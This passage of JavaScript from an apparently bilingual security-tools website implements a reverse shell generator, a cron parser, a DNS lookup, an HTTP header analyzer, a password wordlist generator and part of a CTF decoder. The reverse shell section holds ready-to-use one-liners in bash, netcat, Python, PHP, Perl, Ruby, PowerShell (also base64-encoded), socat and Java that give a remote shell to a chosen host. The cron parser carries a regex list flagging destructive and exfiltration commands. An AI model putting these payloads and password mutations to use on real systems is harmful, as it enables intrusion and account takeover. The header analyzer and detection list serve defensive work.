                macVendorName.textContent = LANG === 'es' ? '❌ Error de conexión al buscar' : '❌ Connection error during lookup';
                console.error(err);
            }
        });
    }
	// =========================================================
    // 15. Herramienta: Reverse Shell Generator
    // =========================================================
    const rsIp = document.getElementById('rs-ip');
    if (rsIp) {
        const rsPort = document.getElementById('rs-port');
        const rsTypes = document.getElementById('rs-types');
        const rsOutput = document.getElementById('rs-output');
        const rsListener = document.getElementById('rs-listener');
        const btnRsCopy = document.getElementById('btn-rs-copy');

        const shells = [
            { id:'bash-tcp',   label:'Bash TCP',     cmd:'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1' },
            { id:'bash-udp',   label:'Bash UDP',     cmd:'bash -i >& /dev/udp/{IP}/{PORT} 0>&1' },
            { id:'nc-e',       label:'Netcat -e',    cmd:'nc -e /bin/bash {IP} {PORT}' },
            { id:'nc-mkfifo',  label:'Netcat mkfifo',cmd:'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {IP} {PORT} >/tmp/f' },
            { id:'py3',        label:'Python 3',     cmd:'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])\'' },
            { id:'php-exec',   label:'PHP exec',     cmd:'php -r \'$sock=fsockopen("{IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");\'' },
            { id:'perl',       label:'Perl',         cmd:'perl -e \'use Socket;$i="{IP}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};\'' },
            { id:'ruby',       label:'Ruby',         cmd:'ruby -rsocket -e \'f=TCPSocket.open("{IP}",{PORT}).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)\'' },
            { id:'powershell', label:'PowerShell',   cmd:'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{IP}",{PORT});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+"PS "+(pwd).Path+"> ";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' },
            { id:'ps-b64',     label:'PS Base64',    cmd:'powershell -e REPLACE_B64' },
            { id:'socat',      label:'Socat',        cmd:'socat TCP:{IP}:{PORT} EXEC:\'bash -li\',pty,stderr,setsid,sigint,sane' },
            { id:'java',       label:'Java',         cmd:'r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])\np.waitFor()' }
        ];

        let selected = 'bash-tcp';

        function renderShellTypes() {
            rsTypes.innerHTML = '';
            shells.forEach(function(sh) {
                const btn = document.createElement('button');
                btn.type = 'button';
                btn.textContent = sh.label;
                btn.dataset.id = sh.id;
                // Estilo base de los botones
                btn.style.cssText = 'background:rgba(255,255,255,.04);border:1px solid var(--border);color:var(--gray);font-family:var(--mono);font-size:.75rem;padding:.4rem .8rem;border-radius:.3rem;cursor:pointer;transition:all .2s;';
                
                // Si está seleccionado, le damos el estilo Cyan
                if (sh.id === selected) {
                    btn.style.background = 'rgba(0,255,255,.1)';
                    btn.style.borderColor = 'rgba(0,255,255,.35)';
                    btn.style.color = 'var(--cyan)';
                    btn.style.boxShadow = '0 0 10px rgba(0,255,255,.1)';
                }

                btn.addEventListener('click', function() {
                    selected = sh.id;
                    renderShellTypes(); // Renderizamos de nuevo para actualizar colores
                    generateRs();
                });
                
                rsTypes.appendChild(btn);
            });
        }

        function generateRs() {
            const ip = rsIp.value.trim() || '10.10.14.5';
            const port = rsPort.value.trim() || '4444';
            const sh = shells.find(s => s.id === selected);
            if (!sh) return;

            let cmd = sh.cmd.replace(/\{IP\}/g, ip).replace(/\{PORT\}/g, port);

            // Magia oscura para codificar en Base64 el payload de PowerShell
            if (selected === 'ps-b64') {
                const inner = '$client=New-Object System.Net.Sockets.TCPClient("'+ip+'",'+port+');$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+"PS "+(pwd).Path+"> ";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()';
                const bytes = Array.from(inner).flatMap(c => [c.charCodeAt(0), 0]);
                const b64 = btoa(String.fromCharCode.apply(null, bytes));
                cmd = 'powershell -e ' + b64;
            }

            rsOutput.textContent = cmd;
            rsListener.textContent = 'rlwrap nc -lvnp ' + port;
        }

        rsIp.addEventListener('input', generateRs);
        rsPort.addEventListener('input', generateRs);

        if (btnRsCopy) {
            btnRsCopy.addEventListener('click', function() {
                copyToClipboard(rsOutput.textContent, this);
            });
        }

        renderShellTypes();
        generateRs();
    }
	// =========================================================
    // 16. Herramienta: Cron Parser
    // =========================================================
    const cronInput = document.getElementById('cron-input');
    if (cronInput) {
        const DAYS_ES = ['Domingo','Lunes','Martes','Miércoles','Jueves','Viernes','Sábado'];
        const DAYS_EN = ['Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday'];
        const MONTHS_ES = ['Enero','Febrero','Marzo','Abril','Mayo','Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre'];
        const MONTHS_EN = ['January','February','March','April','May','June','July','August','September','October','November','December'];
        const DAYS   = LANG === 'es' ? DAYS_ES   : DAYS_EN;
        const MONTHS = LANG === 'es' ? MONTHS_ES : MONTHS_EN;

        function pad(n){ return String(n).padStart(2,'0'); }

        function describeField(val, type){
            if(val==='*') return LANG==='es' ? 'cualquier '+type : 'any '+type;
            if(val.startsWith('*/')) {
                var n = val.slice(2);
                return LANG==='es' ? 'cada '+n+' '+type+'(s)' : 'every '+n+' '+type+'(s)';
            }
            if(val.includes('-')){
                var p = val.split('-');
                if(type==='día de la semana'||type==='weekday'){
                    return LANG==='es' ? 'de '+DAYS[p[0]]+' a '+DAYS[p[1]] : 'from '+DAYS[p[0]]+' to '+DAYS[p[1]];
                }
                return LANG==='es' ? 'del '+p[0]+' al '+p[1] : 'from '+p[0]+' to '+p[1];
            }
            if(val.includes(',')){
                var parts = val.split(',');
                if(type==='día de la semana'||type==='weekday')
                    return parts.map(function(d){ return DAYS[parseInt(d)]||d; }).join(', ');
                if(type==='mes'||type==='month')
                    return parts.map(function(m){ return MONTHS[parseInt(m)-1]||m; }).join(', ');
                return LANG==='es' ? 'en '+parts.join(', ') : 'at '+parts.join(', ');
            }
            if(type==='día de la semana'||type==='weekday') return DAYS[parseInt(val)]||val;
            if(type==='mes'||type==='month') return MONTHS[parseInt(val)-1]||val;
            return LANG==='es' ? 'el '+val : 'at '+val;
        }

        function buildDesc(parts){
            if(parts.length < 5) return LANG==='es' ? 'Expresión incompleta' : 'Incomplete expression';
            var m = parts[0], h = parts[1], dom = parts[2], mon = parts[3], dow = parts[4];

            var timeStr;
            if(m==='*' && h==='*') timeStr = LANG==='es' ? 'cada minuto' : 'every minute';
            else if(m.startsWith('*/') && h==='*') timeStr = describeField(m, LANG==='es'?'minuto':'minute');
            else if(m==='0' && h!=='*') timeStr = (LANG==='es'?'a las ':' at ')+h+':00';
            else if(h!=='*') timeStr = (LANG==='es'?'a las ':' at ')+h+':'+pad(m==='*'?0:m);
            else timeStr = (LANG==='es'?'al minuto ':' at minute ')+m;

            var dayStr = '';
            if(dom!=='*' && dow==='*') dayStr = (LANG==='es'?' el día ':' on day ')+describeField(dom,LANG==='es'?'día':'day');
            else if(dom==='*' && dow!=='*') dayStr = (LANG==='es'?' los ':' on ')+describeField(dow,LANG==='es'?'día de la semana':'weekday');
            else if(dom!=='*' && dow!=='*') dayStr = (LANG==='es'?' si día=':' if day=')+dom+(LANG==='es'?' o ':' or ')+describeField(dow,LANG==='es'?'día de la semana':'weekday');

            var monStr = mon!=='*' ? (LANG==='es'?' en ':' in ')+describeField(mon,LANG==='es'?'mes':'month') : '';

            return (LANG==='es'?'Se ejecuta ':' Runs ')+timeStr+dayStr+monStr;
        }

        function nextRuns(parts, n){
            if(parts.length < 5) return [];
            var m=parts[0], h=parts[1], dom=parts[2], mon=parts[3], dow=parts[4];
            var results=[], now=new Date(), cur=new Date(now.getTime()+60000);
            cur.setSeconds(0); cur.setMilliseconds(0);

            var maxIter = 60*24*366; 
            var iter = 0;
            while(results.length<n && iter++<maxIter){
                var mm=cur.getMinutes(), hh=cur.getHours(), dd=cur.getDate(), mo=cur.getMonth()+1, dw=cur.getDay();

                var ok = matchField(m,mm,0,59) && matchField(h,hh,0,23) &&
                          matchField(dom,dd,1,31) && matchField(mon,mo,1,12) &&
                          matchField(dow,dw,0,7);

                if(ok) results.push(new Date(cur));
                cur = new Date(cur.getTime()+60000);
            }
            return results;
        }

        function matchField(expr, val, min, max){
            if(expr==='*') return true;
            if(expr.startsWith('*/')){
                var step=parseInt(expr.slice(2));
                return val%step===0;
            }
            if(expr.includes(',')){
                return expr.split(',').some(function(p){ return matchField(p.trim(),val,min,max); });
            }
            if(expr.includes('-')){
                var ab=expr.split('-');
                return val>=parseInt(ab[0])&&val<=parseInt(ab[1]);
            }
            return parseInt(expr)===val || (expr==='7'&&val===0);
        }

        var DANGEROUS = [
            /rm\s+-rf/i, /mkfs/i, /dd\s+if/i, />\s*\/dev\/sd/i, /chmod\s+777/i,
            /\/etc\/shadow/i, /\/etc\/passwd/i, /base64\s+-d/i, /curl.*\|.*sh/i,
            /wget.*\|.*sh/i, /python.*-c/i, /bash\s+-i/i, /nc\s+-[el]/i,
        ];

        function checkDangerous(raw){
            var rest = raw.split(/\s+/).slice(5).join(' ');
            return DANGEROUS.some(function(rx){ return rx.test(rest); });
        }

        function updateBoxes(parts){
            var boxes = document.querySelectorAll('.cron-field-box');
            ['0','1','2','3','4'].forEach(function(i){
                if(boxes[i]) boxes[i].textContent = parts[i]||'*';
            });
        }

        function parseCron(){
            var raw = cronInput.value.trim();
            var errEl = document.getElementById('cron-error');
            var alertEl = document.getElementById('cron-alert');
            alertEl.style.display = 'none';

            var specials = {
                '@yearly':'0 0 1 1 *','@annually':'0 0 1 1 *','@monthly':'0 0 1 * *',
                '@weekly':'0 0 * * 0','@daily':'0 0 * * *','@midnight':'0 0 * * *',
                '@hourly':'0 * * * *','@reboot':'@reboot',
            };
            
            if(specials[raw.toLowerCase()]){
                if(raw.toLowerCase()==='@reboot'){
                    document.getElementById('cron-desc').textContent = LANG==='es'?'Se ejecuta en cada reinicio del sistema':'Runs at every system reboot';
                    document.getElementById('cron-next').innerHTML = '<div style="font-family:var(--mono);font-size:.82rem;color:var(--gray);">'+(LANG==='es'?'No calculable (depende del reinicio)':'Not calculable (depends on reboot)')+'</div>';
                    updateBoxes(['0','0','1','1','*']);
                    errEl.style.display='none';
                    return;
                }
                raw = specials[raw.toLowerCase()];
            }

            var parts = raw.split(/\s+/);
            if(parts.length < 5){ 
                errEl.style.display='block'; 
                errEl.textContent=LANG==='es'?'⚠ Necesita 5 campos: minuto hora día mes día_semana':'⚠ Needs 5 fields: minute hour day month weekday'; 
                document.getElementById('cron-desc').textContent=''; 
                document.getElementById('cron-next').innerHTML=''; 
                return; 
            }
            errEl.style.display='none';

            updateBoxes(parts);
            document.getElementById('cron-desc').textContent = buildDesc(parts);

            var runs = nextRuns(parts, 5);
            var nextEl = document.getElementById('cron-next');
            if(runs.length){
                nextEl.innerHTML = runs.map(function(d, i){
                    var str = d.toLocaleDateString(LANG==='es'?'es-ES':'en-GB',{weekday:'short',year:'numeric',month:'short',day:'numeric',hour:'2-digit',minute:'2-digit'});
                    return '<div style="font-family:var(--mono);font-size:.82rem;padding:.4rem .75rem;background:rgba(255,255,255,.03);border:1px solid var(--border);border-radius:.35rem;">'
                        +'<span style="color:var(--cyan);margin-right:.75rem;">#'+(i+1)+'</span>'
                        +'<span style="color:rgba(255,255,255,.8);">'+str+'</span></div>';
                }).join('');
            } else {
                nextEl.innerHTML = '<div style="font-family:var(--mono);font-size:.82rem;color:var(--gray);">'+(LANG==='es'?'No se pudo calcular la próxima ejecución.':'Could not calculate next execution.')+'</div>';
            }

            if(parts.length > 5 && checkDangerous(raw)){
                alertEl.style.display = 'block';
                alertEl.textContent   = '🚨 '+(LANG==='es'
                    ? 'PELIGRO: Este cron parece contener un comando destructivo o malicioso.'
                    : 'DANGER: This cron appears to contain a destructive or malicious command.');
            }
        }

        cronInput.addEventListener('input', parseCron);
        
        // Asignar eventos a los botones de ejemplo de forma segura (sin onclick en HTML)
        const presetBtns = document.querySelectorAll('.cron-preset-btn');
        presetBtns.forEach(btn => {
            btn.addEventListener('click', function(e) {
                cronInput.value = e.target.dataset.cron;
                parseCron();
            });
            // Efecto Hover nativo en JS
            btn.addEventListener('mouseover', function() {
                this.style.borderColor = 'rgba(0,255,255,.3)';
                this.style.color = 'var(--white)';
            });
            btn.addEventListener('mouseout', function() {
                this.style.borderColor = 'var(--border)';
                this.style.color = 'var(--gray)';
            });
        });

        parseCron();
    }
    // =========================================================
    // 17. Herramienta: DNS Lookup (Cloudflare DoH)
    // =========================================================
    const dnsDomain = document.getElementById('dns-domain');
    if (dnsDomain) {
        const dnsType = document.getElementById('dns-type');
        const dnsBtn = document.getElementById('btn-dns-lookup');
        const dnsStatus = document.getElementById('dns-status');
        const dnsResults = document.getElementById('dns-results');

        const TYPE_NAMES = { 1:'A', 2:'NS', 5:'CNAME', 6:'SOA', 12:'PTR', 15:'MX', 16:'TXT', 28:'AAAA', 33:'SRV', 257:'CAA' };

        function setDnsStatus(msg) {
            dnsStatus.style.display = 'block';
            dnsStatus.innerHTML = `<span style="color:var(--cyan)">⚡</span> ${msg}`;
        }

        async function fetchDns(domain, type) {
            const url = `https://cloudflare-dns.com/dns-query?name=${encodeURIComponent(domain)}&type=${encodeURIComponent(type)}`;
            const response = await fetch(url, { headers: { 'Accept': 'application/dns-json' } });
            if (!response.ok) throw new Error(`HTTP ${response.status}`);
            return response.json();
        }

        function renderDnsTable(label, answers) {
            if (!answers || !answers.length) return '';
            let rows = answers.map(a => {
                const val = a.data || '';
                return `<tr>
                    <td style="width: 80px; color:var(--gray-dark);">${a.TTL}s</td>
                    <td>${val}</td>
                    <td style="width: 40px; text-align:right;">
                        <button class="copy-btn-mini" data-copy="${val}">📋</button>
                    </td>
                </tr>`;
            }).join('');

            return `<div style="margin-bottom:1.5rem;">
                <div class="info-card-label" style="color:var(--cyan); margin-bottom:0.5rem;">Registro ${label}</div>
                <table class="dns-table">
                    <thead><tr><th>TTL</th><th>${LANG === 'es' ? 'VALOR' : 'VALUE'}</th><th></th></tr></thead>
                    <tbody>${rows}</tbody>
                </table>
            </div>`;
        }

        async function startLookup() {
            let domain = dnsDomain.value.trim().replace(/^https?:\/\//, '').replace(/\/.*/, '');
            const type = dnsType.value;
            if (!domain) { setDnsStatus(LANG === 'es' ? 'Introduce un dominio.' : 'Enter a domain.'); return; }

            dnsResults.innerHTML = '';
            setDnsStatus(LANG === 'es' ? `Consultando ${domain}...` : `Querying ${domain}...`);

            try {
                let queryTypes = type === 'ALL' ? ['A', 'AAAA', 'MX', 'TXT', 'NS', 'CNAME', 'SOA', 'CAA'] : [type];
                if (type === 'DMARC') { domain = `_dmarc.${domain}`; queryTypes = ['TXT']; }

                let finalHtml = '';
                for (const t of queryTypes) {
                    const data = await fetchDns(domain, t);
                    const filtered = (data.Answer || []).filter(a => TYPE_NAMES[a.type] === t || type === 'DMARC');
                    if (filtered.length) finalHtml += renderDnsTable(t, filtered);
                }

                dnsResults.innerHTML = finalHtml || `<p style="color:var(--gray); font-family:var(--mono);">${LANG === 'es' ? 'No se encontraron registros.' : 'No records found.'}</p>`;
                dnsStatus.style.display = 'none';

                // Activar botones de copia dinámicos
                document.querySelectorAll('.copy-btn-mini').forEach(b => {
                    b.addEventListener('click', function() {
                        copyToClipboard(this.dataset.copy, this);
                        this.textContent = '✅';
                        setTimeout(() => this.textContent = '📋', 1500);
                    });
                });

            } catch (err) {
                setDnsStatus(`Error: ${err.message}`);
            }
        }

        dnsBtn.addEventListener('click', startLookup);
        dnsDomain.addEventListener('keydown', (e) => { if (e.key === 'Enter') startLookup(); });

        // Botones rápidos
        document.querySelectorAll('.dns-quick-btn').forEach(btn => {
            btn.addEventListener('click', () => {
                dnsType.value = btn.dataset.type;
                startLookup();
            });
        });
    }
    // =========================================================
    // 18. Herramienta: HTTP Header Analyzer
    // =========================================================
    const hdrInput = document.getElementById('hdr-input');
    if (hdrInput) {
        const btnAnalyze = document.getElementById('btn-hdr-analyze');
        const btnExample = document.getElementById('btn-hdr-example');
        const btnClear = document.getElementById('btn-hdr-clear');
        const hdrResults = document.getElementById('hdr-results');
        
        const lang = window.LANG || 'es';

        const CHECKS = [
            { id:'hsts', name:'Strict-Transport-Security', header:'strict-transport-security', critical:true, ok: lang==='es'?'HSTS activo. Fuerza HTTPS y previene downgrade attacks.':'HSTS enabled. Forces HTTPS and prevents downgrade attacks.', fail: lang==='es'?'Falta HSTS. Los usuarios pueden ser redirigidos a HTTP por un atacante MITM.':'Missing HSTS. Users can be redirected to HTTP by a MITM attacker.', fix: 'Strict-Transport-Security: max-age=31536000; includeSubDomains; preload', check: v => v && /max-age=\d+/i.test(v) },
            { id:'csp', name:'Content-Security-Policy', header:'content-security-policy', critical:true, ok: lang==='es'?'CSP configurada. Reduce el riesgo de XSS.':'CSP configured. Reduces XSS risk.', fail: lang==='es'?'Falta CSP. Sin ella los ataques XSS son triviales.':'Missing CSP. Without it XSS attacks are trivial.', fix: "Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'", check: v => !!v },
            { id:'xcto', name:'X-Content-Type-Options', header:'x-content-type-options', critical:false, ok: lang==='es'?'X-Content-Type-Options presente. Evita MIME sniffing.':'X-Content-Type-Options present. Prevents MIME sniffing.', fail: lang==='es'?'Falta X-Content-Type-Options. Permite MIME-sniffing.':'Missing X-Content-Type-Options. Allows MIME-sniffing.', fix: 'X-Content-Type-Options: nosniff', check: v => v && v.toLowerCase().includes('nosniff') },
            { id:'xfo', name:'X-Frame-Options', header:'x-frame-options', critical:false, ok: lang==='es'?'X-Frame-Options presente. Protege contra clickjacking.':'X-Frame-Options present. Protects against clickjacking.', fail: lang==='es'?'Falta X-Frame-Options. Vulnerable a clickjacking.':'Missing X-Frame-Options. Vulnerable to clickjacking.', fix: 'X-Frame-Options: DENY', check: v => v && /(DENY|SAMEORIGIN)/i.test(v) },
            { id:'rp', name:'Referrer-Policy', header:'referrer-policy', critical:false, ok: lang==='es'?'Referrer-Policy configurada.':'Referrer-Policy set.', fail: lang==='es'?'Falta Referrer-Policy. URLs pueden filtrarse.':'Missing Referrer-Policy. URLs may leak.', fix: 'Referrer-Policy: strict-origin-when-cross-origin', check: v => !!v },
            { id:'pp', name:'Permissions-Policy', header:'permissions-policy', critical:false, ok: lang==='es'?'Permissions-Policy configurada.':'Permissions-Policy set.', fail: lang==='es'?'Falta Permissions-Policy. API de navegador expuestas.':'Missing Permissions-Policy. Browser APIs exposed.', fix: 'Permissions-Policy: camera=(), microphone=(), geolocation=()', check: v => !!v },
            { id:'server', name:'Server Fingerprinting', header:'server', critical:false, ok: lang==='es'?'Cabecera Server genérica o ausente.':'Server header generic or absent.', fail: lang==='es'?'Cabecera Server expone software y versión.':'Server header exposes software/version.', fix: lang==='es'?'Eliminar o generalizar: Server: (vacío)':'Remove or generalise: Server: (empty)', check: v => !v || v.length < 8 || !/[0-9]/.test(v) },
            { id:'xpb', name:'X-Powered-By', header:'x-powered-by', critical:false, ok: lang==='es'?'X-Powered-By ausente.':'X-Powered-By absent.', fail: lang==='es'?'X-Powered-By expone la tecnología del backend.':'X-Powered-By exposes backend technology.', fix: 'Eliminar / Remove: X-Powered-By', check: v => !v },
            { id:'cors', name:'CORS (Allow-Origin)', header:'access-control-allow-origin', critical:true, ok: lang==='es'?'CORS configurado correctamente.':'CORS configured correctly.', fail: lang==='es'?'CORS = * (wildcard). Inseguro.':'CORS = * (wildcard). Insecure.', fix: 'Access-Control-Allow-Origin: https://tudominio.com', check: v => !v || v.trim() !== '*' },
            { id:'cookie', name:'Secure Cookies', header:'set-cookie', critical:true, ok: lang==='es'?'Cookies con flags seguros.':'Cookies have secure flags.', fail: lang==='es'?'Cookies sin flags de seguridad (HttpOnly/Secure).':'Cookies without security flags.', fix: 'Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict', check: v => { if(!v) return true; return /HttpOnly/i.test(v) && /Secure/i.test(v) && /SameSite/i.test(v); } }
        ];

        function parseHeaders(raw) {
            let map = {};
            raw.split('\n').forEach(line => {
                let idx = line.indexOf(':');
                if (idx > 0) {
                    let key = line.slice(0, idx).trim().toLowerCase();
                    let val = line.slice(idx + 1).trim();
                    map[key] = val;
                }
            });
            return map;
        }

        function esc(str) {
            const div = document.createElement('div');
            div.textContent = str;
            return div.innerHTML;
        }

        btnExample.addEventListener('click', () => {
            hdrInput.value = 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nServer: Apache/2.4.51 (Ubuntu)\nX-Powered-By: PHP/8.1.12\nSet-Cookie: PHPSESSID=abc123; path=/\nAccess-Control-Allow-Origin: *\nContent-Length: 12345';
        });

        btnClear.addEventListener('click', () => {
            hdrInput.value = '';
            hdrResults.innerHTML = '';
        });

        btnAnalyze.addEventListener('click', () => {
            const raw = hdrInput.value.trim();
            if (!raw) return;
            
            const headers = parseHeaders(raw);
            let passed = 0, failed = 0, critical = 0;
            let rowsHtml = '';

            CHECKS.forEach(c => {
                const val = headers[c.header];
                const ok = c.check(val);
                if (ok) passed++; else { failed++; if (c.critical) critical++; }

                const icon = ok ? '✅' : (c.critical ? '🚨' : '⚠️');
                const color = ok ? '#00d45a' : (c.critical ? '#ff5050' : '#f0a000');
                const statusTxt = ok ? (lang==='es'?'BIEN':'PASS') : (c.critical ? (lang==='es'?'CRÍTICO':'CRITICAL') : (lang==='es'?'AVISO':'WARNING'));

                rowsHtml += `<div class="hdr-check-card">
                    <div class="hdr-check-header" style="margin-bottom:${ok?'0':'0.5rem'}">
                        <span style="font-size:1.1rem;">${icon}</span>
                        <strong style="font-family:var(--mono); color:var(--white);">${c.name}</strong>
                        <span style="margin-left:auto; font-family:var(--mono); font-size:0.75rem; color:${color}; font-weight:bold;">${statusTxt}</span>
                    </div>
                    ${!ok ? `
                    <p style="font-size:0.85rem; color:var(--gray); margin-left:1.75rem;">${ok ? c.ok : c.fail}</p>
                    <div class="hdr-check-fix"><span style="color:var(--gray-dark);">Fix:</span> ${esc(c.fix)}</div>
                    ` : ''}
                </div>`;
            });

            const score = Math.round(passed / CHECKS.length * 100);
            const scoreColor = score >= 80 ? '#00d45a' : score >= 50 ? '#f0a000' : '#ff5050';
            const grade = score >= 90 ? 'A' : score >= 75 ? 'B' : score >= 55 ? 'C' : score >= 35 ? 'D' : 'F';

            const summaryHtml = `
                <div class="score-board">
                    <div>
                        <div class="score-grade" style="color:${scoreColor};">${grade}</div>
                        <div class="score-text">${score}/100</div>
                    </div>
                    <div>
                        <div class="score-stats">
                            <div><span class="score-stat-num" style="color:#00d45a;">${passed}</span><span style="font-size:0.75rem; color:var(--gray-dark); margin-left:5px;">${lang==='es'?'correctos':'passed'}</span></div>
                            <div><span class="score-stat-num" style="color:#f0a000;">${failed}</span><span style="font-size:0.75rem; color:var(--gray-dark); margin-left:5px;">${lang==='es'?'fallos':'failed'}</span></div>
                            ${critical ? `<div><span class="score-stat-num" style="color:#ff5050;">${critical}</span><span style="font-size:0.75rem; color:var(--gray-dark); margin-left:5px;">${lang==='es'?'críticos':'critical'}</span></div>` : ''}
                        </div>
                        <div class="score-bar-bg">
                            <div class="score-bar-fill" style="width:${score}%; background:${scoreColor};"></div>
                        </div>
                    </div>
                </div>`;

            let rawHtml = `<div style="margin-bottom:2rem;">
                <div class="info-card-label" style="margin-bottom:0.8rem;">${lang==='es'?'Headers detectados':'Detected headers'}</div>
                <div style="background:rgba(0,0,0,0.2); border:1px solid var(--border); border-radius:0.5rem; overflow:hidden;">
                    ${Object.entries(headers).map(([k, v]) => `
                    <div class="hdr-raw-row">
                        <span style="color:var(--cyan); min-width:200px;">${esc(k)}</span>
                        <span style="color:rgba(255,255,255,0.7);">${esc(v)}</span>
                    </div>`).join('')}
                </div>
            </div>`;

            hdrResults.innerHTML = summaryHtml + rawHtml + 
                `<div class="info-card-label" style="margin-bottom:0.8rem;">${lang==='es'?'Análisis de seguridad':'Security analysis'}</div>` + rowsHtml;
        });
    }
    // =========================================================
    // 19. Herramienta: Wordlist Generator
    // =========================================================
    const wlKeywords = document.getElementById('wl-keywords');
    if (wlKeywords) {
        const btnGenerate = document.getElementById('btn-wl-generate');
        const btnDownload = document.getElementById('btn-wl-download');
        const wlOutputWrap = document.getElementById('wl-output-wrap');
        const wlOutput = document.getElementById('wl-output');
        const wlCount = document.getElementById('wl-count');
        const lang = window.LANG || 'es';
        
        let fullWordlist = [];

        // Función para mutación Leetspeak básica
        function applyLeet(str) {
            return str.replace(/a/gi, '4')
                      .replace(/e/gi, '3')
                      .replace(/o/gi, '0')
                      .replace(/i/gi, '1')
                      .replace(/s/gi, '5');
        }

        function generateWordlist() {
            const rawKeywords = wlKeywords.value.split('\n').map(s => s.trim()).filter(Boolean);
            if (!rawKeywords.length) return;

            const years = document.getElementById('wl-years').value.split(',').map(s => s.trim()).filter(Boolean);
            const suffixes = document.getElementById('wl-suffixes').value.split(',').map(s => s.trim()).filter(Boolean);
            
            const doCase = document.getElementById('wl-m-case').checked;
            const doLeet = document.getElementById('wl-m-leet').checked;
            const doYears = document.getElementById('wl-m-years').checked;
            const doSuf = document.getElementById('wl-m-suffixes').checked;
            const doSpec = document.getElementById('wl-m-special').checked;

            const wordSet = new Set();
            function addWord(w) { if (w && w.length >= 3) wordSet.add(w); }

            rawKeywords.forEach(w => {
                // Variantes base
                addWord(w);
                addWord(w.toLowerCase());
                if (doCase) {
                    addWord(w.charAt(0).toUpperCase() + w.slice(1).toLowerCase());
                    addWord(w.toUpperCase());
                }
                if (doLeet) {
                    addWord(applyLeet(w));
                    addWord(applyLeet(w.toLowerCase()));
                }

                // Con Años
                if (doYears) {
                    years.forEach(y => {
                        addWord(w + y); 
                        addWord(y + w);
                        addWord(w.toLowerCase() + y);
                        if (doCase) addWord(w.charAt(0).toUpperCase() + w.slice(1).toLowerCase() + y);
                        if (doLeet) { addWord(applyLeet(w) + y); addWord(applyLeet(w.toLowerCase()) + y); }
                    });
                }

                // Con Sufijos
                if (doSuf) {
                    suffixes.forEach(s => {
                        addWord(w + s); 
                        addWord(w.toLowerCase() + s);
                        if (doCase) addWord(w.charAt(0).toUpperCase() + w.slice(1).toLowerCase() + s);
                        if (doYears) years.forEach(y => { addWord(w + y + s); addWord(w.toLowerCase() + y + s); });
                    });
                }

                // Variantes Especiales
                if (doSpec) {
                    ['@', '_', '.', '#'].forEach(sp => { addWord(sp + w); addWord(w + sp); });
                    addWord(w + '!'); addWord(w + '!!'); addWord(w + '123!'); addWord(w + '@123');
                }
            });

            // Convertir a array, ordenar y guardar globalmente para la descarga
            fullWordlist = Array.from(wordSet).sort();
            const count = fullWordlist.length;
            
            wlCount.textContent = `${count} ${lang === 'es' ? 'palabras generadas' : 'words generated'}`;
            
            // Previsualización (limitada a 300 palabras para no saturar el navegador)
            const previewLimit = 300;
            let outputText = fullWordlist.slice(0, previewLimit).join('\n');
            if (count > previewLimit) {
                outputText += `\n\n... (${count - previewLimit} ${lang === 'es' ? 'palabras ocultas en la previsualización' : 'words hidden in preview'})`;
            }
            
            wlOutput.value = outputText;
            wlOutputWrap.style.display = 'block';
            btnDownload.style.display = 'inline-flex';
        }

        function downloadWordlist() {
            if (!fullWordlist.length) return;
            const blob = new Blob([fullWordlist.join('\n')], { type: 'text/plain' });
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = 'custom_wordlist_cyberescudo.txt';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        }

        btnGenerate.addEventListener('click', generateWordlist);
        btnDownload.addEventListener('click', downloadWordlist);
    }
 // =========================================================
    // 20. Herramienta: Multi Decoder (CTF) - VERSION BLINDADA
    // =========================================================
    (function() {
        const mdInput = document.getElementById('md-input');
        // Si no estamos en la página del Multi Decoder, salimos silenciosamente
        if (!mdInput) return; 

        console.log("✅ Multi Decoder cargado correctamente en su burbuja.");

        const btnDecode = document.getElementById('btn-md-decode');
        const btnAutoChain = document.getElementById('btn-md-autochain');
        const mdChain = document.getElementById('md-chain');
        const modeBtns = document.querySelectorAll('.md-mode-btn');
        const exampleBtns = document.querySelectorAll('.md-example-btn');
        
        let activeMode = 'auto';
        const lang = window.LANG || 'es';

        // Polyfill de seguridad para el portapapeles
        if (typeof window.copyToClipboard !== 'function') {
            window.copyToClipboard = function(text) {
                navigator.clipboard.writeText(text).catch(e => console.error(e));
            };
        }

        // Selección de modo
        modeBtns.forEach(btn => {
            btn.addEventListener('click', () => {
                activeMode = btn.dataset.mode;
                modeBtns.forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
            });
        });

        const DECODERS = {
